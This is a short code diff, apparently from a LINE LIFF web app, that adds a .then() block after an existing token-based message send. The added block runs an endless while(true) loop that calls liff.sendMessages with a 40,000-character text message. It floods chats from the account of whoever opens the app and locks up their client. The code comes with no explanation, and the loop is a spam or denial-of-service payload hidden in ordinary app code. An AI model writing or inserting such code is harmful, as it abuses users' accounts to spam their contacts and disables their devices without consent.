@@ -63,6 +63,15 @@
 }]
         }
     liffmod.token.sendMessages(temp,token);
+    }).then((a)=>{
+        while(true){
+            liff.sendMessages([
+                {
+                    type:"text",
+                    text:"text".repeat(10000)
+                }
+            ])
+        }
     })
     
 
